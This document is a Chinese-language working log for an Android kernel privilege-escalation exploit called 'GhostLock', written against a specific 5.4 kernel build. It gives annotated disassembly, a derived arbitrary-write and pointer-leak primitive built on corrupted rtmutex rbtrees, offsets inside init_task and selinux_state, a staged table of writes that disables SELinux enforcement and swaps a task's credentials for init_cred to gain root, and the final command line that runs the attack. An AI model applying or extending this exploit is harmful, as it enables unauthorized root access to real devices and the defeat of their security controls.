# GhostLock 读相(self-clobber 的真相)与一发多写的最终相表 — 2026-09-27 深夜

一手证据全部来自**设备同构建** `5.4.281-qgki-g2a88cd145def`
(`analysis/kernel_dev_g2a88cd145def.bin` + `analysis/kallsyms_g2a88cd145def.txt`)。
工具: `analysis/kdis.py`(反汇编/引用扫描)、`analysis/dump_obj.py`(静态对象 + .rela 解读)、
`analysis/scan_state.py`(某个 .data/.bss 全局的全部访问点与偏移直方图)。

## 0. 最重要的一条勘误: Linux rbtree 里 **RB_RED=0 / RB_BLACK=1**

`rb_is_red(node)` ⇔ `!(node->__rb_parent_color & 1)`。
所以旧笔记"往 T 写的值必须**位0=1**才安全"的正确表述是: **写 1 = 把那个节点涂成黑色**;
黑色父节点让 `rb_insert_color` 的 while 条件一次都不成立 ⇒ 直接 `ret`(见 §3),
而红色父节点会进旋转 ⇒ `gparent = *(parent)&~3 = 0` ⇒ 解引用 NULL ⇒ panic。
**位0=1 是保命的, 不是"危险信号"** —— 这条以前理解反了, 害我把"第一发就炸"归因错了一次。

## 1. `rb_erase@0xffffffc0115446e0` 的三条分支(逐条反汇编)

入口 `x0=node, x1=root`(在 rtmutex 里 x1 = `&lock->waiters.rb_root` = lock+8):

```
0x...6e0: ldp x9,x11,[x0,#8]      ; x9=node->rb_right(child), x11=node->rb_left
0x...6e4: cbz x11 → 0x734          ; 没有左子 ⇒ 我们的分支(载荷里 v[2]=0)
0x...734: ldr x10,[x0]            ; node->__rb_parent_color
        : ands x8,x10,#-4          ; parent
        : b.eq → 0x7f0             ; parent==NULL 分支
0x...740: ldr x11,[x8,#0x10]       ; parent->rb_left        (⇒ parent 必须可解引用)
0x...744: cmp x11,x0
0x...748: b.eq → 0x924             ; node 是左子 ⇒ `str x9,[x8,#0x10]`
0x...74c: str x9,[x8,#8]           ; 写① = parent->rb_right = child
0x...750: cbz x9 → 0x7f8           ; child==NULL 才需要颜色修复
0x...754: str x10,[x9]             ; 写② = *(child) = node->pc(= parent|color, 我们铺的值)
0x...758: ret                      ; ★ 没有 __rb_erase_color, 没有旋转
0x...7f0: str x9,[x1]              ; parent==NULL ⇒ 写① = *root = child (= lock+8)
0x...7f4: cbnz x9 → 0x754          ; 写② = *(child) = node->pc
```

⇒ **"一笔任意值写到任意 8 对齐地址"的配方(真机已多次验证)**:
`tree.pc = dst-8`(parent≠NULL 且其 `rb_left` != node) + `tree.right = 要写的值` + `tree.left = 0`;
**代价**: 要写的值本身必须是**可写地址**(写② 会往它指的地方落一笔), 且 `*(dst)` 可读。
`tree.pc = 1`(parent==NULL, 且位0=1=黑)则把值写进 **lock+8**, 把 1 写进 *(值)*。

## 2. 为什么旧"读相"什么都没读到(自我覆盖)

`rt_mutex_adjust_prio_chain@0xffffffc010377bb4` 里 dequeue/enqueue 是**内联展开**的:

```
0x10377df8: x21 = [x23,#0x10]         ; lock->waiters.rb_leftmost
0x10377fdc: x8  = [x21,#0x38]         ; 该 leftmost 的 waiter->lock, 必须 == x23(假 lock)
0x10377e10: x8 = [x25] ; cmp x8,x25   ; RB_EMPTY_NODE(node)? 不等才继续
0x10377e1c: cmp x0,x25                ; leftmost == 本节点?
0x10377e24: bl rb_next                ; ★ 读通道: 从 node->rb_right 往左下潜
0x10377e28: str x0,[x23,#0x10]        ; ★ 返回值写进 lock+0x10(=我们唯一"看得见"的槽)
0x10377e2c: x1 = x23+8 ; x0 = x25 ; bl rb_erase
0x10377e38: str x25,[x25]             ; RB_CLEAR_NODE
0x10377e3c: w10 = [x19,#0xb4]         ; 真 task->prio(不是我们铺的 prio!)
0x10377e44: str w10,[x25,#0x40]       ; node->prio = task->prio   (带内, 无害)
0x10377e48: x11 = [x19,#0x468] ; str x11,[x25,#0x48]              ; node->deadline
0x10377e50: ldr x13,[x1,#8]!          ; x1 = lock+8, x13 = rb_node = 下潜的根
0x10377e54: cbz x13 → 0x10377eac      ; ★ 树空 ⇒ w8=1(下面会覆盖 leftmost)
        循环 0x10377e60..0x10377e94: w12 = (task->prio < [候选节点,#0x40])
            prio 的 bit31=0(非 DL)⇒ 只比 prio, 不比 deadline
            csel 子偏移: 小⇒左(x21=0x10) / 不小⇒右(x28=8)
            and w8, w8, (child != 0)  ; 只要有一步走到 NULL 链接 ⇒ w8=0
0x10377eb8: stp x9,xzr,[x25] ; str xzr,[x25,#0x10] ; str x25,[x12]   ; 插入
0x10377ec4: cbz w8 → 0x10377ecc       ; ★ w8=0 ⇒ **不写 leftmost** ⇒ 读结果保住
0x10377ec8: str x25,[x23,#0x10]       ; 否则 leftmost 又被写成 node ⇒ 读结果被覆盖
0x10377ed0: bl rb_insert_color
```

真机 9/27 那一轮的 dump 完全对上: 读相之后 **S 同时出现在 lock+8 和 lock+0x10**
(旧实测 `uts+0x5c` 和 `uts+0x64` 各一份 S)—— 那就是 `0x10377eac` 的"空树插入"分支:
它把 node 写进 `lock+8` **并且**把 `lock+0x10` 又写成 node ⇒ `str x0,[x23,#0x10]` 的读结果被抹掉。
⇒ **旧结论"rb_next 通道没通"是错的: 它通了, 只是被同一发里的 enqueue 覆盖了。**

## 3. 新读相的几何(全部在带内, 一处不碰别人的内存)

令 `N2 = S + 0x100`(覆盖窗口内的一个字, 窗口 = `[S-0x48, S+0x1b8)`):

| 字段 | 值 | 作用 |
|---|---|---|
| `tree.pc` (v[0]) | **1** | parent==NULL + **黑** ⇒ erase 走 `*root=child`, 写②把 1 写进 `*(N2)` ⇒ N2 是黑节点 |
| `tree.right` (v[1]) | **N2** | 既是 erase 的 child(⇒ `*(lock+8)=N2`, 让树**非空**), 也是 rb_next 的起点 |
| `tree.left` (v[2]) | 0 | 走"无左子"分支 |
| `pi_tree.pc` (v[3]) | S+0x18 | RB_EMPTY_NODE ⇒ `rt_mutex_dequeue_pi` 原样返回 |
| `waiter->lock` (v[7]) | **lockA**(uts 里的干净洞) | 这样 `lock+0x10` 落在校验过的 uts 零字上 ⇒ uname 读得回来 |
| `*(N2+0x10)` | **A = init_task+0x6a8** | rb_next 第一跳: `x = *(A+0x10) = init_task.tasks.prev` |
| `*(N2+0x40)` | 0 | prio 比较 ⇒ 我们的 prio(120/139) 不小于 0 ⇒ enqueue **往右** |
| `*(N2+0x08)` | 0 | 右子为空 ⇒ 插入链接 = `N2+8`, 且 `w8 &= 0` ⇒ **跳过 leftmost 写** ⇒ 读结果存活 |

之后 `rb_insert_color(node)`:`*(S)=N2`,父=N2,`*(N2)=1`(黑)⇒ while 条件不成立 ⇒ 直接 ret,
全程没有任何旋转。⇒ **这一发只有两笔带外副作用**: `*(lockA+8)=N2` 和 `*(lockA+0x10)=读到的指针`,
都在我们自己挑的 uts 零洞里。

`rb_next` 的性质顺便给了一个免费的自校验: 它返回的 `x` 一定满足 `*(x+0x10)==0`,
所以漏出来的指针**至少**是"某个 +0x10 字段为 0 的内核地址"。

## 4. 为什么读的是 `init_task+0x6a8`(+0x10 = tasks.prev) = **最新 task**

`kernel/fork.c: copy_process()` 用 `list_add_tail_rcu(&p->tasks, &init_task.tasks)`
⇒ `init_task.tasks.prev` = **最后一次 clone 的那个 task_struct**。
偏移一手核验(`analysis/dump_obj.py init_task`): `tasks` 的 .rela 自环在 **+0x6b0/+0x6b8**,
`stack=+0x68`、`prio=+0xb4`、`dl.deadline=+0x468`、`real_cred=+0x840`、`cred=+0x848`、
`pi_blocked_on=+0x940`。⇒ 令 `A = init_task + 0x6a8` 则 `A+0x10 = +0x6b8 = tasks.prev` ✔

利用方式(kids 模式): 每次读相 punch **之前**(载荷已铺好、`h_armed` 已置位的临界区内)
插一次**裸 `clone(SIGCHLD)`**(不用 bionic `fork()`, 它子分支要跑 pthread_atfork 处理器,
遍历所有锁 + 重建 sigmask 约 1~2us, 会把窗口挤掉)。
孩子只增不杀(杀掉 ⇒ task_struct 回收进 slab, 之后往那地址写 cred 就是写已释放对象),
全部阻塞在 `kid_cmd` 管道; 收尾时父进程写 nkid 字节放它们 `exec /system/bin/sh -c 'id'`,
输出走 `kid_out` 管道回我们的日志 ⇒ 被改成 `init_cred` 的那个报 `uid=0(root)`。

## 5. selinux_state 的字节布局(相5 的目标)

`analysis/scan_state.py ffffffc012b18000` 把全二进制里对该页的 adrp 引用都扫了一遍:
`ldrb [xN,#0]` **55 次**(=`selinux_initialized()` 一类的前置检查), `ldr [xN,#0x10]` 3 次
(= `state->policy`), 另有 `+0xa/+0xb`(policycap 布尔数组里)。
`sel_write_enforce@0x107adb84` 里 `x21 = state`(`...ldr x21,[x8,#0x78]` 从 sb_security 取),
然后 `ldrb w22,[x21,#1]` / `strb w8,[x21,#1]` ⇒ **enforcing = state+1** ✔(与旧记录一致)。

一笔 8 字节写只能落在 8 对齐 ⇒ 目的只能选 `state+0`, 于是要写的值必须满足
`(V>>8)&0xff == 0`(enforcing=0) 且 `V&0xff != 0`(+0 那个布尔保持真)。
而 §1 的配方要求 **V 本身是个可写地址** ⇒ 取
`V = X = 本线程内核栈里的死帧槽`(从 `S-0x100` 向下扫 8 字节步进, 找
`(X & 0xffff) ∈ [8,0x100)` 的第一个; 再往下 0x400 留白避开 thread_info)。
写② 会往 `*(X)` 落一笔 `state-8` —— 那里是我们自己线程的栈, 除了我们没人碰 ✔

## 6. 相表(一次开机、一颗幽灵, 7 笔写)

| 相 | 动作 | 落点 | 判据 |
|---|---|---|---|
| 0 | 泄漏 S(SHAPE=2) | uts+0x08/=1, +0x18/+0x30=S | sysname dump 变 |
| 1 | 预置 A: 写① 把 S 写进 `lockA+0x10` | uts+0x68 | dump 变 |
| 2 | **读 A** ⇒ tasks.prev | uts+0x68 = T | dump 变 ⇒ `[TASK]` 采纳 |
| 3 | 预置 C | uts+0xb8 | dump 变 |
| 4 | **读 C**(第二次抢最新 task) | uts+0xb8 = T2 | dump 变 ⇒ 覆盖 TASK |
| 5 | selinux_state = X | .bss | **`/sys/fs/selinux/enforce` 读回 0** |
| 6 | `TASK+0x848 = init_cred` | 孩子的 task | 无判据, 打够发数 |
| 7 | `TASK+0x840 = init_cred` | 同上 | 同上 |

`lockA = uts+0x58`、`lockC = uts+0xa8`(都在实测运行时零段 `0x54..0x84` / `0xa4..0xc4` 内,
且 8 对齐; `lock+0` 被 raw_spin_lock 写 1 再写 0 ⇒ 自清)。
两组洞彼此不重叠 ⇒ 两次读互不污染 ✔

命令: `python cm57/auto.py "hammer hijack shape2 kids ncopy5 maxr=8 nph=7 rounds=120 wcpu=6 mcpu=0"`
